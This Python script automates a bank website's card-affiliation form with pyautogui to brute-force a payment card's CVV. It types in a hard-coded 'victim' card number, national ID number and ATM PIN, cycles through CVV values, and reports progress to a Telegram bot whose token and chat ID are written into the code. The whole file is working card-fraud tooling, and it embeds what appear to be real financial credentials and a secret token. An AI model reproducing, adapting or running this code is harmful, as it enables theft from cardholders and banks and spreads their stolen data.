import pyautogui as robot
import time 
import telegram

afiliacion = 279,1013
#tipodedocumento = 1427,572
#click_dni = 1406,417
Ndocumento = 417,648
Ntarjeta = 417,715
Nclavecajero = 417,924
CVV = 417,807
continuar = 292,1021
#reintentar = 1637,984
escape = 544,76

# Este es miooo de hernyu
# no compartir por error, si eres alguien tmre me descuide 
bot_token = '1893337163:AAHXSEBf-9ibMf67B68lgYv7PNrekXlDNoE'
chat_id = '1850445278'
bot = telegram.Bot(token=bot_token)


victima_tar = "4919098298685575" # Es bxl probarlo, crear cuenta cvv : 369
victima_dni = "41834090" 
victima_pasw = "1983"
#block
registro = open("registro.txt","a")
registro.write("Comenzando")
registro.write("\n")

#Pedir datos

print("El programa trabaja de manera descendente 999...998...997...")
print("Programa de Hasen")
inicio = int(input("Desde que número desea comenzar?:  "))
fin = int(input("Hasta que número?:  "))
print("*****************")
print("Presione 'Enter' para continuar")
input()

#Mover y dar click
def abrir (pos,click = 1 ):
	robot.moveTo(pos)
	#pyautogui.moveTo(503,315)
	robot.click(clicks=click)

def logeo ():
	abrir(afiliacion,click=1)
	time.sleep(2)
	#abrir(tipodedocumento) # poner documento dni
	#time.sleep(1)
	#abrir(click_dni)
	#time.sleep(0.3)
	abrir(Ndocumento)
	robot.typewrite(victima_dni)
	time.sleep(0.3)
	abrir(Ntarjeta)
	robot.typewrite(victima_tar)
	time.sleep(0.3)
	abrir(Nclavecajero)
	robot.typewrite(victima_pasw)
	time.sleep(0.3)

print(":D")
bot.send_message(chat_id=chat_id, text = 'Corriendo bot :D')

logeo()

#ccv intento
abrir(CVV)
robot.press('backspace')
robot.press('backspace')
robot.press('backspace')
time.sleep(0.1)
if inicio < 100:
	robot.typewrite("0")
	robot.typewrite(str(inicio))
	time.sleep(0.2)
else:
	robot.typewrite(str(inicio))
	time.sleep(0.2) #tipear

abrir(continuar)
time.sleep(1)

# Para ver cuanto demora en cargar
blanco =  True
contadorEmergencia = 0

while blanco is True :
	try:
		contadorEmergencia += 1
		blanco = robot.pixelMatchesColor(503,315,(205,211,218))
		print("Cargando..."+ blanco)
		time.sleep(0.1)
		if (blanco is False) or (contadorEmergencia >20):
			print("continuando!!")
			break
	except:
		time.sleep(0.1)
		#print("...")


contador = 0 # para reiniciar 

try:

	while inicio>fin :  # >  < # desde 999 para abajo
		
		contador += 1
		#print(contador)
		if contador > 70 : # Reiniciar 
			print("Reiniciando, esperar por favor")
			abrir(escape)
			time.sleep(2)

			logeo() # Logeandose de nuevo

			print("Continuando...")
			contador=0

		print("Intentado con: ",inicio)

		registro = open("registro.txt","a")
		registro.write(str(inicio)) # escribir en el block
		registro.write("\n")
		registro.close()
		inicio = inicio - 1

		time.sleep(0.1)
		#print("Borrando") ##################
		abrir(CVV)
		robot.press('backspace')
		robot.press('backspace')
		robot.press('backspace')
		time.sleep(0.1)
		#por si son bajos de 100
		if inicio < 100:
			robot.typewrite("0")
			robot.typewrite(str(inicio))
			time.sleep(0.3)
			#print("Tipeando") #######################
		else:
			robot.typewrite(str(inicio))
			time.sleep(0.3)
			#print("Tipeando") #########################
		#time.sleep(0.1)

		time.sleep(0.3)
		abrir(continuar)
		# Para ver cuanto demora en cargar
		blanco =  True
		contadorEmergencia = 0

		while blanco is True :
			try:
				contadorEmergencia += 1
				blanco = robot.pixelMatchesColor(503,315,(205,211,218))
				print("Cargando..."+ blanco)
				time.sleep(0.1)
				if (blanco is False) or (contadorEmergencia >20):
					print("continuando!!")
					break
			except:
				time.sleep(0.1)
				#print("...")
		time.sleep(0.1)
		print("--------------------------------")
		contadorerror = 0
		b = None
		c = None
		#print("Entrando")
		lives = open("lives.txt","a")
		while (b is None) and (c is None):# Un " Y " poqe si no cumple 1 se rompe el bucle
			imgAfi = "imgAfi.png"
			b = robot.locateOnScreen(imgAfi, grayscale=True, confidence=0.9, region=(0,0,570,1036))
			#print(b, "b")
			#time.sleep(1)
			
			Encontrado = "Encontrado.png"
			c = robot.locateOnScreen(Encontrado, grayscale=True, confidence=0.9, region=(0,0,570,1036))
			#print(c, "c")
			#time.sleep()
			if (b == None) or (c == None):
				time.sleep(0.2)
				#print("Espere...")
				#print(b)
				#time.sleep(5)
			if contadorerror > 60: # Por si no encuyentra ninguno
				print("Ocurrió un error inesperado")
				lives.close()
				bot.send_message(chat_id=chat_id, text = 'Ocurrio un error, vaya a verlo')
				bot.send_message(chat_id=chat_id, text = 'Se quedo en: '+str(inicio))
				exit()
			contadorerror += 1

		time.sleep(0.3)

		#if b!=None:
			#print("No es: ",inicio)
			#time.sleep(0.5)
		if c!=None: # Por si es LIVE:
			print ('\a')
			print("CVV encontrado: "+ str(inicio+1))
			input ("Presione ' Enter ' para salir")
			quit()


	print("Intentado con: ",inicio+1)
	print ('\a')
	print("Programa finalizado con exito")
	bot.send_message(chat_id=chat_id, text = 'Programa finalizado con exito')
	txt= "Programa finalizado con exito"

except:
	bot.send_message(chat_id=chat_id, text = 'Ocurrio un error, vaya a verlo')
	#robot.alert("ERROR") 
	print ('\a')
	print("Error en el programa")
	print("\nEl numero se quedó en: ", inicio)

print("Presione 'Enter' para continuar")
input()



